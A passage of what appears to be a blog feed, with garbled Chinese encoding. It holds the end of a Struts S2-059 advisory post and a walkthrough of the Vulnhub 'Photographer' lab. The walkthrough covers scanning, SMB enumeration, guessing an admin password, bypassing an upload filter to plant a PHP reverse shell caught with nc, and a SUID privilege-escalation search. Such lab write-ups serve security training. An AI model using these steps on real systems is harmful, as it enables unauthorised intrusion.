ã€‚åœ¨æŒç»­çš„åŠªåŠ›ä¸­ï¼ŒStrutsæ¡†æ¶åŒ…æ‹¬ç¼“è§£æªæ–½ä»¥é™åˆ¶æ³¨å…¥çš„è¡¨è¾¾å¼çš„å½±å“ï¼Œä½†2.5.22ä¹‹å‰çš„Strutsä»æœªè§£å†³æ”»å‡»å‘é‡</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;CVE-2019-0230-S2-059&quot;&gt;&lt;a href=&quot;#CVE-2019-0230-S2-059&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0230(S2-059)&quot;&gt;&lt;/a&gt;CVE-2019-0230(S2-059)&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x00-æ¼æ´ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-æ¼æ´ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.æ¼æ´ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.æ¼æ´ç®€è¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.&lt;/p&gt;
&lt;p&gt;Apache Struts 2.0.0åˆ°2.5.20å¼ºåˆ¶æ‰§è¡ŒåŒé‡OGNLè®¡ç®—ï¼Œå½“å¯¹åŸå§‹ç”¨æˆ·è¾“å…¥çš„æ ‡è®°å±æ€§è¿›è¡Œè®¡ç®—æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Strust2/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/tags/Strust2/"/>
    
  </entry>
  
  <entry>
    <title>Photographer</title>
    <link href="https://lunamoore.github.io/2020/12/18/Photographer/"/>
    <id>https://lunamoore.github.io/2020/12/18/Photographer/</id>
    <published>2020-12-18T13:00:50.000Z</published>
    <updated>2020-12-19T02:36:15.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote><p>This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p></blockquote><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap"><a href="#0x01-ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap"></a>0x01.ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ254ä¸ºç‰©ç†æœºï¼Œ129ä¸ºkaliï¼Œé‚£ä¹ˆ135å°±æ˜¯ç›®æ ‡</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:13 EST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:EB:EE:5F (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.129</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 27.96 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x02-æ‰«æç«¯å£"><a href="#0x02-æ‰«æç«¯å£" class="headerlink" title="0x02.æ‰«æç«¯å£"></a>0x02.æ‰«æç«¯å£</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†80ã€139ã€8000ã€445(SMB)ç­‰æ•æ„Ÿç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sC -sV -sT 192.168.1.135 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:23 EST</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Photographer by v1n1v131r4</span><br><span class="line">139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-generator: Koken 0.22.24</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: daisa ahomi</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h40m00s, deviation: 2h53m12s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: photographer</span><br><span class="line">|   NetBIOS computer name: PHOTOGRAPHER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: photographer</span><br><span class="line">|_  System time: 2020-12-18T14:23:58-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-12-18T19:23:57</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 55.84 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œæ˜¯ä¸€ä¸ªé™æ€ç•Œé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆå‘ç°</code></p><img src="/2020/12/18/Photographer/image-20201218192822059.png" class><h2 id="0x04-è®¿é—®8000ç«¯å£"><a href="#0x04-è®¿é—®8000ç«¯å£" class="headerlink" title="0x04.è®¿é—®8000ç«¯å£"></a>0x04.è®¿é—®8000ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°CMSä¸ºKokenï¼Œå¹¶ä¸”å‘ç°ä¸€ä¸ªshell.phpä¸çŸ¥é“è‚è‚¾çš„ã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218193224511.png" class><p><code>æŸ¥çœ‹æºç ï¼Œå‘ç°CMSç‰ˆæœ¬ä¸º0.22.24</code></p><img src="/2020/12/18/Photographer/image-20201218193326700.png" class><h2 id="0x05-Google-exploit"><a href="#0x05-Google-exploit" class="headerlink" title="0x05.Google exploit"></a>0x05.Google exploit</h2><p><code>æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œemmmmmm.åˆšæ‰çˆ¬è™«çš„é¡µé¢æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œæ‰€ä»¥çŒœæµ‹éœ€è¦ç™»å…¥åˆ°åå°è¿›è¡Œä¸Šä¼ ã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218193515066.png" class><h2 id="0x06-è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰"><a href="#0x06-è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰" class="headerlink" title="0x06.è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰"></a>0x06.è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰</h2><p><code>è¿™é‡Œå…¶å®éœ€è¦æ‰«ä¸€ä¸‹ç›®å½•ï¼Œä½†æ˜¯çŒœåˆ°äº†adminï¼Œå°±ä¸èµ˜è¿°äº†ğŸŒšã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218193934550.png" class><p><code>å°è¯•å¼±å£ä»¤ç™»å…¥ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·åéœ€è¦æ˜¯ä¸€ä¸ªé‚®ç®±ï¼Œä½†ä¸æ˜¯çŸ¥é“æ ¼å¼ï¼Œæ•…æ— æ³•è¿›è¡Œçˆ†ç ´ã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218194227961.png" class><h2 id="0x07-å®¡æŸ¥445ç«¯å£"><a href="#0x07-å®¡æŸ¥445ç«¯å£" class="headerlink" title="0x07.å®¡æŸ¥445ç«¯å£"></a>0x07.å®¡æŸ¥445ç«¯å£</h2><p><code>å‰é¢å‘ç°äº†å¼€æ”¾äº†445ç«¯å£ï¼Œæ‰€ä»¥ä½¿ç”¨enum4linuxå¼€å§‹æ¢ç´¢ä¸€ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# enum4linux -a -o 192.168.1.135</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Dec 18 06:45:16 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.1.135</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &#x27;&#x27;</span><br><span class="line">Password ......... &#x27;&#x27;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================= </span><br><span class="line">|    Nbtstat Information for 192.168.1.135    |</span><br><span class="line"> ============================================= </span><br><span class="line">Looking up status of 192.168.1.135</span><br><span class="line">        PHOTOGRAPHER    &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        PHOTOGRAPHER    &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        PHOTOGRAPHER    &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    Session Check on 192.168.1.135    |</span><br><span class="line"> ====================================== </span><br><span class="line">[+] Server 192.168.1.135 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Getting domain SID for 192.168.1.135    |</span><br><span class="line"> ============================================ </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can&#x27;t determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    OS information on 192.168.1.135    |</span><br><span class="line"> ======================================= </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.1.135 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.1.135 from srvinfo:</span><br><span class="line">        PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server type     :       0x809a03</span><br><span class="line"></span><br><span class="line"> ============================== </span><br><span class="line">|    Users on 192.168.1.135    |</span><br><span class="line"> ============================== </span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span><br><span class="line"></span><br><span class="line"> ========================================== </span><br><span class="line">|    Share Enumeration on 192.168.1.135    |</span><br><span class="line"> ========================================== </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        sambashare      Disk      Samba on Ubuntu</span><br><span class="line">        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.1.135</span><br><span class="line">//192.168.1.135/print$  Mapping: DENIED, Listing: N/A</span><br><span class="line">//192.168.1.135/sambashare      Mapping: OK, Listing: OK</span><br><span class="line">//192.168.1.135/IPC$    [E] Can&#x27;t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Password Policy Information for 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">..........(çœç•¥éƒ¨åˆ†æ— å…³ç´§è¦çš„å†…å®¹)</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting printer info for 192.168.1.135    |</span><br><span class="line"> ============================================== </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Fri Dec 18 06:45:30 2020</span><br><span class="line"></span><br><span class="line">root@JIYE:~#</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥å‘ç°sambaæœåŠ¡çš„ä¸€ä¸ªç›®å½•sambashare</code></p><blockquote><p>//192.168.1.135/sambashare      Mapping: OK, Listing: OK</p></blockquote><p><code>åŒ¿åç›´æ¥è¿æ¥è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°ä¸€ä¸ªwordpressç«™ç‚¹çš„å¤‡ä»½æ–‡ä»¶å’Œä¸€ä¸ªtxtæ–‡ä»¶</code></p><img src="/2020/12/18/Photographer/image-20201218195708592.png" class><p><code>æ ¹æ®æ–‡ä»¶åmailsent.txtæ–‡ä»¶æ˜¯ä¸€å°å‘é€çš„é‚®ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;</span><br><span class="line">Date: Mon, 20 Jul 2020 11:40:36 -0400</span><br><span class="line">From: Agi Clarence &lt;agi@photographer.com&gt;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0</span><br><span class="line">X-Accept-Language: en-us, en</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: Daisa Ahomi &lt;daisa@photographer.com&gt;</span><br><span class="line">Subject: To Do - Daisa Website&#x27;s</span><br><span class="line">Content-Type: text/plain; charset=us-ascii; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Hi Daisa!</span><br><span class="line">Your site is ready now.</span><br><span class="line">Don&#x27;t forget your secret, my babygirl ;)</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥çœ‹åˆ°é‚®ç®±ä¸ºdaisa@photographer.com</code></p><p><code>è¿˜æœ‰é‚®ä»¶å†…å®¹ä¸ºä½ çš„ç½‘ç«™ç°åœ¨å‡†å¤‡å¥½äº†ï¼Œä¸è¦å¿˜è®°ä½ çš„å¯†ç my babygirl</code></p><p><code>è¿™é‡Œæ¨æµ‹å¯†ç ä¸ºbabygirlï¼Œæ‰€ä»¥å°è¯•ç™»å…¥ï¼ŒOKæ¨æµ‹æ­£ç¡®</code></p><img src="/2020/12/18/Photographer/image-20201218200838692.png" class><h2 id="0x08-ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell"><a href="#0x08-ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell" class="headerlink" title="0x08.ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell"></a>0x08.ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell</h2><p><code>æœ¬æ¬¡ä½¿ç”¨kaliè‡ªå¸¦reverse shellè·¯å¾„(/usr/share/webshells/php/php-reverse-shell.php)</code></p><p><code>å°†IPä¿®æ”¹ä¸ºkaliæœ¬èº«ï¼Œç«¯å£ä¸º6666</code></p><img src="/2020/12/18/Photographer/image-20201218201703596.png" class><p><code>ä¸Šä¼ </code></p><img src="/2020/12/18/Photographer/image-20201218202118418.png" class><p><code>ç»“æœä»…ä»…å¯ä»¥ä¸Šä¼ JPGã€PNGã€GIFã€MP4æ ¼å¼æ–‡ä»¶ï¼Œæ‰€ä»¥å…ˆä¿®æ”¹æ–‡ä»¶åç¼€</code></p><img src="/2020/12/18/Photographer/image-20201218202345783.png" class><p><code>è¿›è¡Œä¸Šä¼ </code></p><img src="/2020/12/18/Photographer/image-20201218202606655.png" class><p><code>æŠ“åŒ…å°†åç¼€æ”¹å›php</code></p><img src="/2020/12/18/Photographer/image-20201218203003281.png" class><p><code>kaliç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç‚¹å‡»åå¼¹shell</code></p><img src="/2020/12/18/Photographer/image-20201218203246226.png" class><img src="/2020/12/18/Photographer/image-20201218203335202.png" class><p><code>æˆåŠŸget shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.135] 56236</span><br><span class="line">Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 15:33:07 up  1:44,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><p><code>é¦–å…ˆå‡çº§shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>å‡çº§äº¤äº’shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line">www-data@photographer:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>åœ¨daisaæ‰¾åˆ°user.txtçš„flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ cat user.txt </span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><code>suidææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥å‘ç°php7.2å¯ä»¥åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/php7.2</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><span class="exturl" 